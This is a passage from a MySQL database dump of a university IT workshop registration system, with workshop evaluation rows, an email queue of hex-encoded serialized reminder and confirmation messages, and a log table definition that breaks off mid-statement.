('evaluations', '79', 31, '1'),
('evaluations', '79', 32, '1'),
('evaluations', '79', 33, '4'),
('evaluations', '79', 34, '0'),
('evaluations', '79', 35, '1'),
('evaluations', '79', 36, ''),
('evaluations', '79', 37, ''),
('evaluations', '79', 38, '1'),
('evaluations', '79', 39, '1'),
('evaluations', '80', 24, '0'),
('evaluations', '80', 25, '0'),
('evaluations', '80', 26, '0'),
('evaluations', '80', 27, '0'),
('evaluations', '80', 28, '2'),
('evaluations', '80', 30, '2'),
('evaluations', '80', 31, '1'),
('evaluations', '80', 32, '1'),
('evaluations', '80', 33, '1'),
('evaluations', '80', 34, '0'),
('evaluations', '80', 35, '1'),
('evaluations', '80', 36, ''),
('evaluations', '80', 37, ''),
('evaluations', '80', 38, '0'),
('evaluations', '80', 39, '0'),
('evaluations', '81', 24, '0'),
('evaluations', '81', 25, '0'),
('evaluations', '81', 26, '0'),
('evaluations', '81', 27, '0'),
('evaluations', '81', 28, '2'),
('evaluations', '81', 30, '2'),
('evaluations', '81', 31, '0'),
('evaluations', '81', 32, '0'),
('evaluations', '81', 33, '0'),
('evaluations', '81', 34, '0'),
('evaluations', '81', 35, '0'),
('evaluations', '81', 36, ''),
('evaluations', '81', 37, ''),
('evaluations', '81', 38, '0'),
('evaluations', '81', 39, '0'),
('evaluations', '82', 24, '0'),
('evaluations', '82', 25, '0'),
('evaluations', '82', 26, '0'),
('evaluations', '82', 27, '0'),
('evaluations', '82', 28, '2'),
('evaluations', '82', 30, '2'),
('evaluations', '82', 31, '0'),
('evaluations', '82', 32, '0'),
('evaluations', '82', 33, '0'),
('evaluations', '82', 34, '0'),
('evaluations', '82', 35, '0'),
('evaluations', '82', 36, ''),
('evaluations', '82', 37, ''),
('evaluations', '82', 38, '0'),
('evaluations', '82', 39, '0'),
('evaluations', '83', 24, '0'),
('evaluations', '83', 25, '0'),
('evaluations', '83', 26, '0'),
('evaluations', '83', 27, '0'),
('evaluations', '83', 28, '2'),
('evaluations', '83', 30, '2'),
('evaluations', '83', 31, '0'),
('evaluations', '83', 32, '0'),
('evaluations', '83', 33, '0'),
('evaluations', '83', 34, '0'),
('evaluations', '83', 35, '0'),
('evaluations', '83', 36, 'Giving us some homeworks with the results, so we can practice a little more after class.'),
('evaluations', '83', 37, 'Specifies the OIT building adresses'),
('evaluations', '83', 38, '0'),
('evaluations', '83', 39, '0'),
('evaluations', '84', 24, '0'),
('evaluations', '84', 25, '0'),
('evaluations', '84', 26, '0'),
('evaluations', '84', 27, '1'),
('evaluations', '84', 28, '2'),
('evaluations', '84', 30, '2'),
('evaluations', '84', 31, '1'),
('evaluations', '84', 32, '0'),
('evaluations', '84', 33, '0'),
('evaluations', '84', 34, '0'),
('evaluations', '84', 35, '0'),
('evaluations', '84', 36, 'Divide workshops based on study areas'),
('evaluations', '84', 37, 'Send alerts to remind appointments'),
('evaluations', '84', 38, '0'),
('evaluations', '84', 39, '1'),
('evaluations', '85', 24, '1'),
('evaluations', '85', 25, '1'),
('evaluations', '85', 26, '1'),
('evaluations', '85', 27, '1'),
('evaluations', '85', 28, '2'),
('evaluations', '85', 30, '2'),
('evaluations', '85', 31, '0'),
('evaluations', '85', 32, '1'),
('evaluations', '85', 33, '0'),
('evaluations', '85', 34, '1'),
('evaluations', '85', 35, '0'),
('evaluations', '85', 36, 'I thought the workshop was fine.'),
('evaluations', '85', 37, 'The class was fine.  Very comfortable and understanding,  very professional and informing.'),
('evaluations', '85', 38, '0'),
('evaluations', '85', 39, '1'),
('evaluations', '86', 24, '0'),
('evaluations', '86', 25, '0'),
('evaluations', '86', 26, '0'),
('evaluations', '86', 27, '0'),
('evaluations', '86', 28, '2'),
('evaluations', '86', 30, '2'),
('evaluations', '86', 31, '0'),
('evaluations', '86', 32, '0'),
('evaluations', '86', 33, '0'),
('evaluations', '86', 34, '0'),
('evaluations', '86', 35, '0'),
('evaluations', '86', 36, ''),
('evaluations', '86', 37, ''),
('evaluations', '86', 38, '1'),
('evaluations', '86', 39, '0'),
('evaluations', '87', 24, '1'),
('evaluations', '87', 25, '1'),
('evaluations', '87', 26, '0'),
('evaluations', '87', 27, '0'),
('evaluations', '87', 28, '0'),
('evaluations', '87', 30, '2'),
('evaluations', '87', 31, '0'),
('evaluations', '87', 32, '1'),
('evaluations', '87', 33, '1'),
('evaluations', '87', 34, '0'),
('evaluations', '87', 35, '0'),
('evaluations', '87', 36, 'Although the customer order database can apply across all disciplines, it might be helpful to use examples that translate to an academic environment, whether it be an HR database or academics.\r\n\r\n\r\nIn addition, Dave has done a great job!'),
('evaluations', '87', 37, 'It''s not too easy to find this evaluation website at the conclusion of the class.'),
('evaluations', '87', 38, '0'),
('evaluations', '87', 39, '0'),
('evaluations', '88', 24, '0'),
('evaluations', '88', 25, '0'),
('evaluations', '88', 26, '0'),
('evaluations', '88', 27, '0'),
('evaluations', '88', 28, '2'),
('evaluations', '88', 30, '2'),
('evaluations', '88', 31, '0'),
('evaluations', '88', 32, '0'),
('evaluations', '88', 33, '0'),
('evaluations', '88', 34, '0'),
('evaluations', '88', 35, '0'),
('evaluations', '88', 36, ''),
('evaluations', '88', 37, ''),
('evaluations', '88', 38, '1'),
('evaluations', '88', 39, '0'),
('evaluations', '89', 24, '1'),
('evaluations', '89', 25, '1'),
('evaluations', '89', 26, '1'),
('evaluations', '89', 27, '1'),
('evaluations', '89', 28, '2'),
('evaluations', '89', 30, '2'),
('evaluations', '89', 31, '1'),
('evaluations', '89', 32, '1'),
('evaluations', '89', 33, '4'),
('evaluations', '89', 34, '1'),
('evaluations', '89', 35, '1'),
('evaluations', '89', 36, 'Spend more time talking through/applying the concepts, not just focusing on clicking and typing. This would help us understand WHY we''re doing the things we''re doing. I found queries a llittle tricky, so a little more practice of the concepts would be helpful.'),
('evaluations', '89', 37, ''),
('evaluations', '89', 38, '1'),
('evaluations', '89', 39, '0'),
('evaluations', '90', 24, '0'),
('evaluations', '90', 25, '0'),
('evaluations', '90', 26, '0'),
('evaluations', '90', 27, '1'),
('evaluations', '90', 28, '2'),
('evaluations', '90', 30, '2'),
('evaluations', '90', 31, '0'),
('evaluations', '90', 32, '0'),
('evaluations', '90', 33, '0'),
('evaluations', '90', 34, '0'),
('evaluations', '90', 35, '1'),
('evaluations', '90', 36, 'More related to specific areas'),
('evaluations', '90', 37, 'Maybe FAQ''s'),
('evaluations', '90', 38, '1'),
('evaluations', '90', 39, '1'),
('evaluations', '91', 24, '0'),
('evaluations', '91', 25, '1'),
('evaluations', '91', 26, '1'),
('evaluations', '91', 27, '0'),
('evaluations', '91', 28, '2'),
('evaluations', '91', 30, '2'),
('evaluations', '91', 31, '0'),
('evaluations', '91', 32, '0'),
('evaluations', '91', 33, '1'),
('evaluations', '91', 34, '1'),
('evaluations', '91', 35, '0'),
('evaluations', '91', 36, 'the workshop was very help as is'),
('evaluations', '91', 37, 'the class was great..enjoyed very much'),
('evaluations', '91', 38, '0'),
('evaluations', '91', 39, '0'),
('evaluations', '92', 24, '0'),
('evaluations', '92', 25, '0'),
('evaluations', '92', 26, '0'),
('evaluations', '92', 27, '0'),
('evaluations', '92', 28, '2'),
('evaluations', '92', 30, '2'),
('evaluations', '92', 31, '1'),
('evaluations', '92', 32, '0'),
('evaluations', '92', 33, '1'),
('evaluations', '92', 34, '0'),
('evaluations', '92', 35, '0'),
('evaluations', '92', 36, 'Twanda is an excellent instructor and is thoroughly professional.'),
('evaluations', '92', 37, ''),
('evaluations', '92', 38, '0'),
('evaluations', '92', 39, '0'),
('evaluations', '93', 24, '0'),
('evaluations', '93', 25, '0'),
('evaluations', '93', 26, '0'),
('evaluations', '93', 27, '0'),
('evaluations', '93', 28, '2'),
('evaluations', '93', 30, '2'),
('evaluations', '93', 31, '0'),
('evaluations', '93', 32, '0'),
('evaluations', '93', 33, '0'),
('evaluations', '93', 34, '0'),
('evaluations', '93', 35, '0'),
('evaluations', '93', 36, ''),
('evaluations', '93', 37, ''),
('evaluations', '93', 38, '0'),
('evaluations', '93', 39, '0'),
('evaluations', '94', 24, '1'),
('evaluations', '94', 25, '0'),
('evaluations', '94', 26, '1'),
('evaluations', '94', 27, '1'),
('evaluations', '94', 28, '2'),
('evaluations', '94', 30, '2'),
('evaluations', '94', 31, '1'),
('evaluations', '94', 32, '4'),
('evaluations', '94', 33, '4'),
('evaluations', '94', 34, '1'),
('evaluations', '94', 35, '1'),
('evaluations', '94', 36, ''),
('evaluations', '94', 37, ''),
('evaluations', '94', 38, '1'),
('evaluations', '94', 39, '1'),
('evaluations', '95', 24, '0'),
('evaluations', '95', 25, '0'),
('evaluations', '95', 26, '0'),
('evaluations', '95', 27, '0'),
('evaluations', '95', 28, '2'),
('evaluations', '95', 30, '2'),
('evaluations', '95', 31, '0'),
('evaluations', '95', 32, '0'),
('evaluations', '95', 33, '0'),
('evaluations', '95', 34, '0'),
('evaluations', '95', 35, '0'),
('evaluations', '95', 36, 'Dave is an excellent instructor and is thoroughly professional.'),
('evaluations', '95', 37, ''),
('evaluations', '95', 38, '0'),
('evaluations', '95', 39, '0'),
('evaluations', '96', 24, '0'),
('evaluations', '96', 25, '0'),
('evaluations', '96', 26, '0'),
('evaluations', '96', 27, '0'),
('evaluations', '96', 28, '2'),
('evaluations', '96', 30, '2'),
('evaluations', '96', 31, '0'),
('evaluations', '96', 32, '0'),
('evaluations', '96', 33, '0'),
('evaluations', '96', 34, '0'),
('evaluations', '96', 35, '0'),
('evaluations', '96', 36, ''),
('evaluations', '96', 37, 'update hand out docs to reflect the current environment'),
('evaluations', '96', 38, '0'),
('evaluations', '96', 39, '0'),
('evaluations', '97', 24, '1'),
('evaluations', '97', 25, '0'),
('evaluations', '97', 26, '0'),
('evaluations', '97', 27, '1'),
('evaluations', '97', 28, '2'),
('evaluations', '97', 30, '2'),
('evaluations', '97', 31, '1'),
('evaluations', '97', 32, '1'),
('evaluations', '97', 33, '1'),
('evaluations', '97', 34, '1'),
('evaluations', '97', 35, '1'),
('evaluations', '97', 36, ''),
('evaluations', '97', 37, ''),
('evaluations', '97', 38, '1'),
('evaluations', '97', 39, '1'),
('evaluations', '98', 24, '1'),
('evaluations', '98', 25, '1'),
('evaluations', '98', 26, '1'),
('evaluations', '98', 27, '1'),
('evaluations', '98', 28, '2'),
('evaluations', '98', 30, '2'),
('evaluations', '98', 31, '1'),
('evaluations', '98', 32, '1'),
('evaluations', '98', 33, '1'),
('evaluations', '98', 34, '1'),
('evaluations', '98', 35, '1'),
('evaluations', '98', 36, ''),
('evaluations', '98', 37, ''),
('evaluations', '98', 38, '1'),
('evaluations', '98', 39, '1'),
('evaluations', '99', 24, '1'),
('evaluations', '99', 25, '1'),
('evaluations', '99', 26, '1'),
('evaluations', '99', 27, '1'),
('evaluations', '99', 28, '2'),
('evaluations', '99', 30, '1'),
('evaluations', '99', 31, '1'),
('evaluations', '99', 32, '1'),
('evaluations', '99', 33, '1'),
('evaluations', '99', 34, '1'),
('evaluations', '99', 35, '1'),
('evaluations', '99', 36, 'I would like a bit more content on other office aps in addition to word 2007'),
('evaluations', '99', 37, ''),
('evaluations', '99', 38, '1'),
('evaluations', '99', 39, '1');

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_email_queue`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_email_queue` (
  `queueId` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `attributeName` varchar(128) NOT NULL DEFAULT '',
  `attributeId` int(10) unsigned NOT NULL DEFAULT '0',
  `zendMailObject` blob NOT NULL,
  `queueDt` int(10) unsigned NOT NULL DEFAULT '0',
  `sentDt` int(10) unsigned NOT NULL DEFAULT '0',
  `status` enum('waiting','sent','error') NOT NULL DEFAULT 'waiting',
  PRIMARY KEY (`queueId`),
  KEY `attributeName` (`attributeName`),
  KEY `attributeId` (`attributeId`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1051 ;

--
-- Dumping data for table `oit_tbl_ot_email_queue`
--

INSERT INTO `oit_tbl_ot_email_queue` (`queueId`, `attributeName`, `attributeId`, `zendMailObject`, `queueDt`, `sentDt`, `status`) VALUES
(1046, 'triggerActionId', 102, 0x4f3a393a225a656e645f4d61696c223a31373a7b733a31313a22002a005f63686172736574223b733a31303a2269736f2d383835392d31223b733a31313a22002a005f68656164657273223b613a333a7b733a323a22546f223b613a323a7b693a303b733a31373a226a6661757374696e406e6373752e656475223b733a363a22617070656e64223b623a313b7d733a343a2246726f6d223b613a323a7b693a303b733a31373a22636c617373726567406e6373752e656475223b733a363a22617070656e64223b623a313b7d733a373a225375626a656374223b613a313a7b693a303b733a34373a224576616c756174696f6e2052656d696e6465723a202044657369676e205061747465726e7320776974682050485035223b7d7d733a31383a22002a005f686561646572456e636f64696e67223b733a31363a2271756f7465642d7072696e7461626c65223b733a383a22002a005f66726f6d223b733a31373a22636c617373726567406e6373752e656475223b733a363a22002a005f746f223b613a313a7b693a303b733a31373a226a6661757374696e406e6373752e656475223b7d733a31343a22002a005f726563697069656e7473223b613a313a7b733a31373a226a6661757374696e406e6373752e656475223b693a313b7d733a31343a22002a005f72657475726e50617468223b4e3b733a31313a22002a005f7375626a656374223b733a34373a224576616c756174696f6e2052656d696e6465723a202044657369676e205061747465726e7320776974682050485035223b733a383a22002a005f64617465223b4e3b733a31333a22002a005f6d6573736167654964223b4e3b733a31323a22002a005f626f647954657874223b4f3a31343a225a656e645f4d696d655f50617274223a31323a7b733a343a2274797065223b733a31303a22746578742f706c61696e223b733a383a22656e636f64696e67223b733a31363a2271756f7465642d7072696e7461626c65223b733a323a226964223b4e3b733a31313a22646973706f736974696f6e223b733a363a22696e6c696e65223b733a383a2266696c656e616d65223b4e3b733a31313a226465736372697074696f6e223b4e3b733a373a2263686172736574223b733a31303a2269736f2d383835392d31223b733a383a22626f756e64617279223b4e3b733a383a226c6f636174696f6e223b4e3b733a383a226c616e6775616765223b4e3b733a31313a22002a005f636f6e74656e74223b733a3635383a2244656172204a61736f6e2041757374696e2c0d0a0d0a596f757220666565646261636b20697320696d706f7274616e7420746f2075732e20506c6561736520766973697420746865206f7572207765627369746520616e6420636f6d706c65746520796f7572206576616c756174696f6e206f662074686520666f6c6c6f77696e6720776f726b73686f703a0d0a0d0a576f726b73686f703a2044657369676e205061747465726e73207769746820504850350d0a446174653a2031302f30312f323030392066726f6d20333a303020706d20746f20343a303020706d0d0a4c6f636174696f6e3a202042322f423320436f6e666572656e636520526f6f6d202028323632302048696c6c73626f726f756768205374726565742052616c656967682c204e43203237363935290d0a496e7374727563746f72733a20204761727269736f6e204c6f636b65202867706c6f636b65406e6373752e656475290d0a0d0a0d0a5468616e6b20796f75210d0a5477616e64612042616b65720d0a4f495420547261696e696e6720436f6f7264696e61746f720d0a636c617373726567406e6373752e6564750d0a0d0a0d0a546f2072657475726e20746f204f4954277320436c6173736d61746520526567697374726174696f6e2053797374656d2c20636c69636b2074686520756e6465726c696e6564206c696e6b2062656c6f772e20496620796f757220656d61696c2073797374656d20646f6573206e6f7420737570706f72742055524c206c696e6b732c20796f752063616e20636f70792074686973206c696e6b20616e6420706173746520697420696e746f20796f7572207765622062726f777365722e0d0a0d0a687474703a2f2f776562617070732e6e6373752e6564752f636c6173736d617465223b733a31323a22002a005f697353747265616d223b623a303b7d733a31323a22002a005f626f647948746d6c223b623a303b733a31363a22002a005f6d696d65426f756e64617279223b4e3b733a383a22002a005f74797065223b4e3b733a31343a226861734174746163686d656e7473223b623a303b733a393a22002a005f7061727473223b613a303a7b7d733a383a22002a005f6d696d65223b4e3b7d, 1254493246, 0, 'waiting'),
(1047, 'triggerActionId', 87, 0x4f3a393a225a656e645f4d61696c223a31373a7b733a31313a22002a005f63686172736574223b733a31303a2269736f2d383835392d31223b733a31313a22002a005f68656164657273223b613a333a7b733a323a22546f223b613a323a7b693a303b733a31353a2261646d696e4061646d696e2e636f6d223b733a363a22617070656e64223b623a313b7d733a343a2246726f6d223b613a323a7b693a303b733a31373a22636c617373726567406e6373752e656475223b733a363a22617070656e64223b623a313b7d733a373a225375626a656374223b613a313a7b693a303b733a36333a224f495420576f726b73686f707320436f6e6669726d6174696f6e3a20416374697665204469726563746f72793a204f552041646d696e697374726174696f6e223b7d7d733a31383a22002a005f686561646572456e636f64696e67223b733a31363a2271756f7465642d7072696e7461626c65223b733a383a22002a005f66726f6d223b733a31373a22636c617373726567406e6373752e656475223b733a363a22002a005f746f223b613a313a7b693a303b733a31353a2261646d696e4061646d696e2e636f6d223b7d733a31343a22002a005f726563697069656e7473223b613a313a7b733a31353a2261646d696e4061646d696e2e636f6d223b693a313b7d733a31343a22002a005f72657475726e50617468223b4e3b733a31313a22002a005f7375626a656374223b733a36333a224f495420576f726b73686f707320436f6e6669726d6174696f6e3a20416374697665204469726563746f72793a204f552041646d696e697374726174696f6e223b733a383a22002a005f64617465223b4e3b733a31333a22002a005f6d6573736167654964223b4e3b733a31323a22002a005f626f647954657874223b4f3a31343a225a656e645f4d696d655f50617274223a31323a7b733a343a2274797065223b733a31303a22746578742f706c61696e223b733a383a22656e636f64696e67223b733a31363a2271756f7465642d7072696e7461626c65223b733a323a226964223b4e3b733a31313a22646973706f736974696f6e223b733a363a22696e6c696e65223b733a383a2266696c656e616d65223b4e3b733a31313a226465736372697074696f6e223b4e3b733a373a2263686172736574223b733a31303a2269736f2d383835392d31223b733a383a22626f756e64617279223b4e3b733a383a226c6f636174696f6e223b4e3b733a383a226c616e6775616765223b4e3b733a31313a22002a005f636f6e74656e74223b733a313334323a22446561722041646d696e204d6341646d696e2c0d0a5468616e6b20796f7520666f7220626f6f6b696e6720616e206170706f696e746d656e742077697468204f495420576f726b73686f70732e205468652064657461696c73206f6620796f7572206170706f696e746d656e74206172652062656c6f773a0d0a0d0a576f726b73686f703a20416374697665204469726563746f72793a204f552041646d696e697374726174696f6e0d0a446174653a2030312f32312f323031302066726f6d20393a303020616d20746f2031303a303020616d0d0a4c6f636174696f6e3a202041756469746f7269756d202d2044482048696c6c204c696272617279202028290d0a496e7374727563746f72733a20202028290d0a0d0a5061727469636970616e74732061726520657870656374656420746f207072696e7420616e64206272696e67206120636f7079206f662074686520776f726b73686f702068616e646f75747320746f20636c6173732e20576f726b73686f70206d6174657269616c732063616e20626520666f756e6420627920636c69636b696e6720746865204d79204170706f696e746d656e7473206c696e6b20696e206f757220436c6173736d61746520526567697374726174696f6e2073797374656d2e20496620796f757220776f726b73686f7020646f6573206e6f7420686176652061206c696e6b20666f722068616e64736f75742c20616e79206d6174657269616c7320666f72207468617420706172746963756c617220776f726b73686f702077696c6c2062652070726f76696465642062792074686520696e7374727563746f72206174207468652074696d65206f662074686520636c6173732e205468616e6b20796f7520696e20616476616e636520666f7220796f757220636f2d6f7065726174696f6e2e0d0a0d0a596f752077696c6c207265636569766520612072656d696e646572207072696f7220746f2074686520776f726b73686f702e20496620796f752061726520756e61626c6520746f20617474656e64207468697320776f726b73686f702c20706c6561736520757365206f7572206f6e6c696e6520726567697374726174696f6e2073797374656d20746f2063616e63656c2074686520776f726b73686f702066726f6d20796f7572207363686564756c6520696d6d6564696174656c7920736f2074686174206f7468657273206d617920726567697374657220666f7220796f757220736561742e0d0a0d0a0d0a4e4f54453a20204966206c657373207468616e20352070656f706c6520726567697374657220666f72207468697320776f726b73686f70206974206d61792062652063616e63656c65642e2020496e2074686973206576656e742c20796f752077696c6c206265206e6f74696669656420696e20616476616e636520627920656d61696c2e0d0a0d0a2d2d204f495420547261696e696e6720436f6f7264696e61746f720d0a636c617373726567406e6373752e6564750d0a0d0a546f2072657475726e20746f204f4954277320436c6173736d61746520526567697374726174696f6e2053797374656d2c20636c69636b2074686520756e6465726c696e6564206c696e6b2062656c6f772e20496620796f757220656d61696c2073797374656d20646f6573206e6f7420737570706f72742055524c206c696e6b732c20796f752063616e20636f70792074686973206c696e6b20616e6420706173746520697420696e746f20796f7572207765622062726f777365722e0d0a0d0a687474703a2f2f776562617070732e6e6373752e6564752f636c6173736d6174650d0a0d0a5468616e6b20596f75223b733a31323a22002a005f697353747265616d223b623a303b7d733a31323a22002a005f626f647948746d6c223b623a303b733a31363a22002a005f6d696d65426f756e64617279223b4e3b733a383a22002a005f74797065223b4e3b733a31343a226861734174746163686d656e7473223b623a303b733a393a22002a005f7061727473223b613a303a7b7d733a383a22002a005f6d696d65223b4e3b7d, 1263306320, 0, 'waiting'),
(1048, 'triggerActionId', 89, 0x4f3a393a225a656e645f4d61696c223a31373a7b733a31313a22002a005f63686172736574223b733a31303a2269736f2d383835392d31223b733a31313a22002a005f68656164657273223b613a333a7b733a323a22546f223b613a323a7b693a303b733a303a22223b733a363a22617070656e64223b623a313b7d733a343a2246726f6d223b613a323a7b693a303b733a31373a22636c617373726567406e6373752e656475223b733a363a22617070656e64223b623a313b7d733a373a225375626a656374223b613a313a7b693a303b733a36383a22496e7374727563746f72205369676e7570204e6f74696669636174696f6e3a2020416374697665204469726563746f72793a204f552041646d696e697374726174696f6e223b7d7d733a31383a22002a005f686561646572456e636f64696e67223b733a31363a2271756f7465642d7072696e7461626c65223b733a383a22002a005f66726f6d223b733a31373a22636c617373726567406e6373752e656475223b733a363a22002a005f746f223b613a313a7b693a303b733a303a22223b7d733a31343a22002a005f726563697069656e7473223b613a313a7b733a303a22223b693a313b7d733a31343a22002a005f72657475726e50617468223b4e3b733a31313a22002a005f7375626a656374223b733a36383a22496e7374727563746f72205369676e7570204e6f74696669636174696f6e3a2020416374697665204469726563746f72793a204f552041646d696e697374726174696f6e223b733a383a22002a005f64617465223b4e3b733a31333a22002a005f6d6573736167654964223b4e3b733a31323a22002a005f626f647954657874223b4f3a31343a225a656e645f4d696d655f50617274223a31323a7b733a343a2274797065223b733a31303a22746578742f706c61696e223b733a383a22656e636f64696e67223b733a31363a2271756f7465642d7072696e7461626c65223b733a323a226964223b4e3b733a31313a22646973706f736974696f6e223b733a363a22696e6c696e65223b733a383a2266696c656e616d65223b4e3b733a31313a226465736372697074696f6e223b4e3b733a373a2263686172736574223b733a31303a2269736f2d383835392d31223b733a383a22626f756e64617279223b4e3b733a383a226c6f636174696f6e223b4e3b733a383a226c616e6775616765223b4e3b733a31313a22002a005f636f6e74656e74223b733a3138383a222c0d0a0d0a54686520666f6c6c6f77696e672073747564656e7420686173207369676e656420757020666f7220796f757220776f726b73686f702022416374697665204469726563746f72793a204f552041646d696e697374726174696f6e22206f6e2030312f32312f323031303a0d0a0d0a41646d696e204d6341646d696e0d0a61646d696e4061646d696e2e636f6d0d0a0d0a0d0a0d0a5468616e6b20596f750d0a4f495420547261696e696e6720436f6f7264696e61746f72223b733a31323a22002a005f697353747265616d223b623a303b7d733a31323a22002a005f626f647948746d6c223b623a303b733a31363a22002a005f6d696d65426f756e64617279223b4e3b733a383a22002a005f74797065223b4e3b733a31343a226861734174746163686d656e7473223b623a303b733a393a22002a005f7061727473223b613a303a7b7d733a383a22002a005f6d696d65223b4e3b7d, 1263306320, 0, 'waiting'),
(1049, 'triggerActionId', 90, 0x4f3a393a225a656e645f4d61696c223a31373a7b733a31313a22002a005f63686172736574223b733a31303a2269736f2d383835392d31223b733a31313a22002a005f68656164657273223b613a333a7b733a323a22546f223b613a323a7b693a303b733a31353a2261646d696e4061646d696e2e636f6d223b733a363a22617070656e64223b623a313b7d733a343a2246726f6d223b613a323a7b693a303b733a31373a22636c617373726567406e6373752e656475223b733a363a22617070656e64223b623a313b7d733a373a225375626a656374223b613a313a7b693a303b733a35393a224f495420576f726b73686f70732043616e63656c6c6174696f6e3a205573696e6720746865204f6666696365203230303720496e74657266616365223b7d7d733a31383a22002a005f686561646572456e636f64696e67223b733a31363a2271756f7465642d7072696e7461626c65223b733a383a22002a005f66726f6d223b733a31373a22636c617373726567406e6373752e656475223b733a363a22002a005f746f223b613a313a7b693a303b733a31353a2261646d696e4061646d696e2e636f6d223b7d733a31343a22002a005f726563697069656e7473223b613a313a7b733a31353a2261646d696e4061646d696e2e636f6d223b693a313b7d733a31343a22002a005f72657475726e50617468223b4e3b733a31313a22002a005f7375626a656374223b733a35393a224f495420576f726b73686f70732043616e63656c6c6174696f6e3a205573696e6720746865204f6666696365203230303720496e74657266616365223b733a383a22002a005f64617465223b4e3b733a31333a22002a005f6d6573736167654964223b4e3b733a31323a22002a005f626f647954657874223b4f3a31343a225a656e645f4d696d655f50617274223a31323a7b733a343a2274797065223b733a31303a22746578742f706c61696e223b733a383a22656e636f64696e67223b733a31363a2271756f7465642d7072696e7461626c65223b733a323a226964223b4e3b733a31313a22646973706f736974696f6e223b733a363a22696e6c696e65223b733a383a2266696c656e616d65223b4e3b733a31313a226465736372697074696f6e223b4e3b733a373a2263686172736574223b733a31303a2269736f2d383835392d31223b733a383a22626f756e64617279223b4e3b733a383a226c6f636174696f6e223b4e3b733a383a226c616e6775616765223b4e3b733a31313a22002a005f636f6e74656e74223b733a3433373a22446561722041646d696e204d6341646d696e2c0d0a0d0a596f7572207265736572766174696f6e20666f722074686520776f726b73686f7020225573696e6720746865204f6666696365203230303720496e7465726661636522207363686564756c656420666f722030312f32312f3230313020686173206265656e2063616e63656c65642e20200d0a0d0a5468616e6b732c0d0a5477616e64612042616b65720d0a4f495420547261696e696e6720436f6f7264696e61746f720d0a636c617373726567406e6373752e6564750d0a0d0a546f2072657475726e20746f204f4954277320436c6173736d61746520526567697374726174696f6e2053797374656d2c20636c69636b2074686520756e6465726c696e6564206c696e6b2062656c6f772e20496620796f757220656d61696c2073797374656d20646f6573206e6f7420737570706f72742055524c206c696e6b732c20796f752063616e20636f70792074686973206c696e6b20616e6420706173746520697420696e746f20796f7572207765622062726f777365722e0d0a0d0a687474703a2f2f776562617070732e6e6373752e6564752f636c6173736d617465223b733a31323a22002a005f697353747265616d223b623a303b7d733a31323a22002a005f626f647948746d6c223b623a303b733a31363a22002a005f6d696d65426f756e64617279223b4e3b733a383a22002a005f74797065223b4e3b733a31343a226861734174746163686d656e7473223b623a303b733a393a22002a005f7061727473223b613a303a7b7d733a383a22002a005f6d696d65223b4e3b7d, 1263563679, 0, 'waiting'),
(1050, 'triggerActionId', 91, 0x4f3a393a225a656e645f4d61696c223a31373a7b733a31313a22002a005f63686172736574223b733a31303a2269736f2d383835392d31223b733a31313a22002a005f68656164657273223b613a333a7b733a323a22546f223b613a323a7b693a303b733a303a22223b733a363a22617070656e64223b623a313b7d733a343a2246726f6d223b613a323a7b693a303b733a31373a22636c617373726567406e6373752e656475223b733a363a22617070656e64223b623a313b7d733a373a225375626a656374223b613a313a7b693a303b733a37303a22496e7374727563746f722043616e63656c6c6174696f6e204e6f74696669636174696f6e3a20205573696e6720746865204f6666696365203230303720496e74657266616365223b7d7d733a31383a22002a005f686561646572456e636f64696e67223b733a31363a2271756f7465642d7072696e7461626c65223b733a383a22002a005f66726f6d223b733a31373a22636c617373726567406e6373752e656475223b733a363a22002a005f746f223b613a313a7b693a303b733a303a22223b7d733a31343a22002a005f726563697069656e7473223b613a313a7b733a303a22223b693a313b7d733a31343a22002a005f72657475726e50617468223b4e3b733a31313a22002a005f7375626a656374223b733a37303a22496e7374727563746f722043616e63656c6c6174696f6e204e6f74696669636174696f6e3a20205573696e6720746865204f6666696365203230303720496e74657266616365223b733a383a22002a005f64617465223b4e3b733a31333a22002a005f6d6573736167654964223b4e3b733a31323a22002a005f626f647954657874223b4f3a31343a225a656e645f4d696d655f50617274223a31323a7b733a343a2274797065223b733a31303a22746578742f706c61696e223b733a383a22656e636f64696e67223b733a31363a2271756f7465642d7072696e7461626c65223b733a323a226964223b4e3b733a31313a22646973706f736974696f6e223b733a363a22696e6c696e65223b733a383a2266696c656e616d65223b4e3b733a31313a226465736372697074696f6e223b4e3b733a373a2263686172736574223b733a31303a2269736f2d383835392d31223b733a383a22626f756e64617279223b4e3b733a383a226c6f636174696f6e223b4e3b733a383a226c616e6775616765223b4e3b733a31313a22002a005f636f6e74656e74223b733a3138373a222c0d0a0d0a465949202d200d0a557365722041646d696e204d6341646d696e2063616e63656c6564207468656972207265736572766174696f6e20666f72205573696e6720746865204f6666696365203230303720496e74657266616365207363686564756c656420666f722030312f32312f323031302e0d0a0d0a0d0a5477616e64612042616b65720d0a4f495420547261696e696e6720436f6f7264696e61746f720d0a5477616e64615f42616b6572406e6373752e656475223b733a31323a22002a005f697353747265616d223b623a303b7d733a31323a22002a005f626f647948746d6c223b623a303b733a31363a22002a005f6d696d65426f756e64617279223b4e3b733a383a22002a005f74797065223b4e3b733a31343a226861734174746163686d656e7473223b623a303b733a393a22002a005f7061727473223b613a303a7b7d733a383a22002a005f6d696d65223b4e3b7d, 1263563679, 0, 'waiting');

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_log`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_log` (
  `logId` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `accountId` int(10) unsigned NOT NULL DEFAULT '0',
  `role` varchar(128) CHARACTER SET utf8 NOT NULL DEFAULT '',
  `request` varchar(255) CHARACTER SET utf8 NOT NULL DEFAULT '',
  `sid` varchar(128) CHARACTER SET utf8 NOT NULL DEFAULT '',
  `timestamp` int(10) unsigned NOT NULL DEFAULT '0',
  `message` varchar(255) CHARACTER SET utf8 NOT NULL DEFAULT '',
  `priority` int(10) unsigned NOT NULL DEFAULT '0',
  `priorityName` varchar(64) CHARACTER SET utf8 NOT NULL DEFAULT '',
  `attributeName` varchar(128) CHARACTER SET utf8 NOT NULL DEFAULT '',
  `attributeId` varchar(64) CHARACTER SET utf8 NOT NULL DEFAULT '',
  PRIMARY KEY (`logId`),
  KEY `userId` (`accountId`),
  KEY `attributeName` (`attributeName`),
  KEY `attributeId` (`attributeId`)
